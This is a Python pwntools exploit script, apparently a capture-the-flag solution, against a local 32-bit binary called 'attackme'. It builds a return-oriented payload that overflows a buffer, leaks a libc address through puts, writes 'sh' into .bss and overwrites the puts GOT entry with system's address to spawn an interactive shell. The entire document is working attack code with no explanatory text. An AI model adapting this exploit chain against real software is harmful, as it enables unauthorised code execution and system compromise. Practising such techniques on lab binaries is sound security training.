from pwn import *
context(arch='i386', os='linux')

target = "./attackme"

p = process(target) #, env={"LD_PRELOAD": "./libc-2.23.so"})
e = ELF(target)

pppr = 0x080485f9
ppr = pppr + 1
pr = ppr + 1
plt_read = e.plt['read']
plt_puts = e.plt['puts']
plt_write = e.plt['write']
got_puts = e.got['puts']
bss_area = 0x0804a000

got_libc_main = e.got['__libc_start_main']

print p.recv()


payload = 'A' * 0x64
payload += 'BBBB'
payload += p32(plt_puts)
payload += p32(pr)
payload += p32(got_libc_main)
payload += p32(plt_read)
payload += p32(pppr)
payload += p32(0)
payload += p32(bss_area)
payload += p32(4)
payload += p32(plt_read)
payload += p32(pppr)
payload += p32(0)
payload += p32(got_puts)
payload += p32(4)
payload += p32(plt_puts)
payload += p32(pr)
payload += p32(bss_area)

p.send(payload)

recv = u32(p.recv().split("\n")[0][-8:-4])

got_system = 0x3a940
libc_base = recv - 0x18540
got_system = libc_base + got_system

print "libc start: {}".format(hex(recv))
print "libc base : {}".format(hex(libc_base))
print "system    : {}".format(hex(got_system))

raw_input('')

p.send("sh\x00\x00")
p.send(p32(got_system))

p.interactive()





